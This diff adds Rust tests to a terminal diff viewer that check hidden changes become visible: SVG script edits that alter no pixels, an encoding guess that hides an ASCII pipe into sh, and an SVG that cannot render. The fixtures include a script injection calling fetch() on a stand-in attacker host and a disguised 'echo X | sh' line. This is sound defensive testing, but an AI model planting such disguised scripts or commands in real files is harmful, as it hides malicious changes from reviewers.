@@ -1490,8 +1490,86 @@ fn tui_pane_header_switches_markdown_views_and_image_modes() {
     let header: String = (0..160).map(|x| screen[(x, row)].symbol().to_string()).collect();
     for mode in ["2-up", "Swipe", "Onion skin", "Difference"] { assert!(header.contains(mode), "{mode}: {header}"); }
     assert!(!text(&screen).contains("Inline"));
+    assert!(!header.contains("Source"), "a raster image has no source: {header}");
     click(&mut image, locate(&screen, "Swipe"));
     assert_eq!(image.visual.image_state().mode(), lenz::image_session::Mode::Swipe);
+}
+
+fn svg_pair(old: &str, new: &str) -> (tempfile::TempDir, App) {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join("old.svg"), old).unwrap();
+    std::fs::write(dir.path().join("new.svg"), new).unwrap();
+    let request = lenz::cli::parse(&["--no-index".into(), "old.svg".into(), "new.svg".into()], dir.path()).unwrap();
+    let mut app = App::new(lenz::session::Session::open(request, dir.path().into()));
+    ready(&mut app);
+    (dir, app)
+}
+const SVG: &str = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\">\n<rect width=\"16\" height=\"16\" fill=\"#f00\"/>\n</svg>\n";
+
+#[test]
+fn tui_svg_source_mode_shows_a_change_its_rendering_does_not() {
+    use lenz::image_session::Mode;
+    let script = SVG.replace("</svg>", "<script>fetch(\"https://attacker.example.invalid/\")</script>\n</svg>");
+    let (_dir, mut app) = svg_pair(SVG, &script);
+    let screen = draw(&mut app, 160, 30);
+    assert!(app.visual.image().is_some(), "the rendering opens");
+    let row = app.diff_area.y + 1;
+    let header: String = (0..160).map(|x| screen[(x, row)].symbol().to_string()).collect();
+    assert!(header.contains("Source"), "{header}");
+    assert!(!text(&screen).contains("Identical"), "0 px changed, but the bytes differ: {}", text(&screen));
+    assert!(text(&screen).contains("source differs"));
+    assert!(!text(&screen).contains("<script>"));
+    // one click on Source: the line diff with its find and copy
+    click(&mut app, locate(&screen, "Source"));
+    ready(&mut app);
+    assert_eq!(app.visual.image_state().mode(), Mode::Source);
+    assert!(app.visual.image().is_none() && app.visual.rendering().is_some());
+    let screen = draw(&mut app, 160, 30);
+    assert!(text(&screen).contains("<script>fetch("), "{}", text(&screen));
+    assert_eq!(app.interaction_disabled(lenz::commands::Interaction::Find), None);
+    assert!(app.session.view().block_ranges().len() == 1, "the added line is a change block");
+    assert!(lenz::catalog::header_switch(&app.scope()).iter().any(|e| e.label == "Source" && e.current));
+    // a diff option re-diffs the source and keeps it on screen
+    app.run_action(lenz::catalog::Action::Comparison(lenz::commands::Command::SetWhitespace(lenz_engine::WhitespaceMode::Ignore)));
+    ready(&mut app);
+    let screen = draw(&mut app, 160, 30);
+    assert_eq!(app.visual.image_state().mode(), Mode::Source);
+    assert!(text(&screen).contains("<script>fetch("));
+    // and back to the rendering
+    click(&mut app, locate(&screen, "2-up"));
+    assert!(app.visual.image().is_some());
+    // too narrow for the header's modes: the palette still offers Source, enabled
+    let screen = draw(&mut app, 60, 20);
+    assert!(app.header_switch.is_empty(), "{}", text(&screen));
+    use lenz::catalog::Availability as _;
+    let source = lenz::image_session::image_commands().iter().position(|e| e.command == lenz::image_session::ImageCommand::SetMode(Mode::Source)).unwrap();
+    assert!(lenz::catalog::entries(&app.scope()).iter().any(|e| e.action == lenz::catalog::Action::Image(source)));
+    assert_eq!(app.disabled(lenz::catalog::Action::Image(source)), None);
+}
+
+#[test]
+fn tui_status_says_when_a_guessed_encoding_hides_ascii_bytes() {
+    let dir = tempfile::tempdir().unwrap();
+    // "# 設定を表示" in Shift_JIS, then a pipe after a lead byte that the guess reads as one katakana
+    let comment = b"# \x90\xDD\x92\xE8\x82\xF0\x95\x5C\x8E\xA6\n";
+    std::fs::write(dir.path().join("old.sh"), [&comment[..], b"echo safe\n"].concat()).unwrap();
+    std::fs::write(dir.path().join("new.sh"), [&comment[..], b"printf '%s\\n' 'echo X' \x83| sh\n"].concat()).unwrap();
+    let request = lenz::cli::parse(&["--no-index".into(), "old.sh".into(), "new.sh".into()], dir.path()).unwrap();
+    let mut app = App::new(lenz::session::Session::open(request, dir.path().into()));
+    ready(&mut app);
+    let screen = draw(&mut app, 160, 30);
+    assert!(text(&screen).contains(lenz::encoding::HIDES_ASCII_NOTICE), "{}", text(&screen));
+}
+
+#[test]
+fn tui_an_svg_that_cannot_be_drawn_shows_its_text_and_says_why() {
+    let broken = SVG.replace("width=\"16\" height=\"16\">", "width=\"0\" height=\"0\">").replace("</svg>", "<script>alert(1)</script>\n</svg>");
+    let (_dir, mut app) = svg_pair(SVG, &broken);
+    let screen = draw(&mut app, 160, 30);
+    assert!(app.visual.rendering().is_none());
+    assert!(text(&screen).contains("<script>alert(1)</script>"), "{}", text(&screen));
+    assert!(text(&screen).contains("cannot show as an image"), "{}", text(&screen));
+    assert!(!text(&screen).contains("Identical"));
 }
 
 #[test]
